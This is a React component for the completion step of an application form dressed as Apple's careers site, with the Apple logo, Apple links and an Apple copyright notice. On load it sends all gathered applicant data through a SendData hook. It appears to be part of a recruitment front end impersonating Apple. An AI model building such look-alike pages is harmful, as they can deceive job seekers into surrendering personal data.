import React, { useContext } from "react";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages";
import ApplicationComplete from "../frriSpecific/ApplicationComplete.js";

const appleFont = "-apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', Helvetica, Arial, sans-serif";

function Done() {
  let { AllData } = useContext(DataContext);

  React.useEffect(() => {
    const params = {
      ...AllData,
      currentStep: "Done",
    };
    SendData(params);
  }, []);

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh", background: "#f5f5f7", fontFamily: appleFont }}>

      {/* Apple Header */}
      <header style={{ background: "rgba(255,255,255,0.85)", backdropFilter: "saturate(180%) blur(20px)", borderBottom: "1px solid rgba(0,0,0,0.08)", padding: "0 40px", height: "52px", display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, zIndex: 100 }}>
        <a href="https://www.apple.com/careers/us/" target="_blank" rel="noopener noreferrer" style={{ display: "flex", alignItems: "center", textDecoration: "none" }}>
          <svg width="20" height="24" viewBox="0 0 814 1000" fill="#1d1d1f" aria-label="Apple logo">
            <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-37.3-167.2-107.8c-52.3-61.3-95.8-155.2-95.8-244.2 0-170.1 111.4-259.7 220.7-259.7 61 0 112.7 39.7 151 39.7 37.3 0 97.3-41.8 166.3-41.8 26.4 0 108.2 2.4 168.6 71.7zm-174.5-71.4c-30.9-36.7-74.9-61.3-121.7-61.3-50.5 0-101.7 36.1-132.7 72.8-28.3 33.1-51.3 84.4-51.3 135.5 0 7.1.6 14.2 1.2 16.5 3.2.6 8.4 1.2 13.6 1.2 45.4 0 96.5-30.3 126.8-66.4 29.7-35.4 52.4-86.7 52.4-138.5 0-7.1-.6-12.3-1.2-18.9"/>
          </svg>
        </a>
        <nav style={{ display: "flex", gap: "28px" }}>
          <a href="https://www.apple.com/careers/us/" target="_blank" rel="noopener noreferrer" style={{ color: "#1d1d1f", fontSize: "0.8125rem", textDecoration: "none", fontFamily: appleFont }}>Jobs</a>
          <a href="https://www.apple.com/careers/us/life-at-apple.html" target="_blank" rel="noopener noreferrer" style={{ color: "#1d1d1f", fontSize: "0.8125rem", textDecoration: "none", fontFamily: appleFont }}>Life at Apple</a>
          <a href="https://www.apple.com/careers/us/benefits.html" target="_blank" rel="noopener noreferrer" style={{ color: "#1d1d1f", fontSize: "0.8125rem", textDecoration: "none", fontFamily: appleFont }}>Benefits</a>
        </nav>
      </header>

      {/* Main content */}
      <main style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", paddingTop: "50px" }}>
        <ApplicationComplete />
      </main>

      {/* Apple Footer */}
      <footer style={{ background: "#f5f5f7", borderTop: "1px solid rgba(0,0,0,0.1)", padding: "20px 40px", marginTop: "auto" }}>
        <div style={{ maxWidth: "980px", margin: "0 auto" }}>
          <div style={{ display: "flex", flexWrap: "wrap", justifyContent: "space-between", gap: "16px", marginBottom: "16px" }}>
            <div>
              <p style={{ fontFamily: appleFont, fontSize: "0.75rem", color: "#6e6e73", marginBottom: "8px" }}>Explore Career Areas</p>
              <ul style={{ listStyle: "none", padding: 0, margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                {[["Software & Services","https://www.apple.com/careers/us/software-and-services.html"],["Hardware","https://www.apple.com/careers/us/hardware.html"],["Machine Learning & AI","https://www.apple.com/careers/us/machine-learning-and-ai.html"],["Apple Retail","https://www.apple.com/careers/us/retail.html"]].map(([name, url], i) => (
                  <li key={i}><a href={url} target="_blank" rel="noopener noreferrer" style={{ color: "#6e6e73", fontSize: "0.75rem", textDecoration: "none", fontFamily: appleFont }}>{name}</a></li>
                ))}
              </ul>
            </div>
            <div>
              <p style={{ fontFamily: appleFont, fontSize: "0.75rem", color: "#6e6e73", marginBottom: "8px" }}>Life at Apple</p>
              <ul style={{ listStyle: "none", padding: 0, margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                {[["Culture","https://www.apple.com/careers/us/life-at-apple.html"],["Inclusion & Diversity","https://www.apple.com/diversity/"],["Benefits","https://www.apple.com/careers/us/benefits.html"],["Students & Graduates","https://www.apple.com/careers/us/students.html"]].map(([name, url], i) => (
                  <li key={i}><a href={url} target="_blank" rel="noopener noreferrer" style={{ color: "#6e6e73", fontSize: "0.75rem", textDecoration: "none", fontFamily: appleFont }}>{name}</a></li>
                ))}
              </ul>
            </div>
            <div>
              <p style={{ fontFamily: appleFont, fontSize: "0.75rem", color: "#6e6e73", marginBottom: "8px" }}>Legal</p>
              <ul style={{ listStyle: "none", padding: 0, margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                {[["Privacy Policy","https://www.apple.com/legal/privacy/"],["Terms of Use","https://www.apple.com/legal/internet-services/terms/site.html"],["Legal Information","https://www.apple.com/legal/"],["Site Map","https://www.apple.com/sitemap/"]].map(([name, url], i) => (
                  <li key={i}><a href={url} target="_blank" rel="noopener noreferrer" style={{ color: "#6e6e73", fontSize: "0.75rem", textDecoration: "none", fontFamily: appleFont }}>{name}</a></li>
                ))}
              </ul>
            </div>
          </div>
          <div style={{ borderTop: "1px solid rgba(0,0,0,0.08)", paddingTop: "16px", display: "flex", flexWrap: "wrap", justifyContent: "space-between", alignItems: "center", gap: "8px" }}>
            <p style={{ fontSize: "0.6875rem", color: "#6e6e73", margin: 0, fontFamily: appleFont }}>Copyright © {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
            <p style={{ fontSize: "0.6875rem", color: "#6e6e73", margin: 0, fontFamily: appleFont }}>Apple is an equal opportunity employer committed to inclusion and diversity.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default Done;

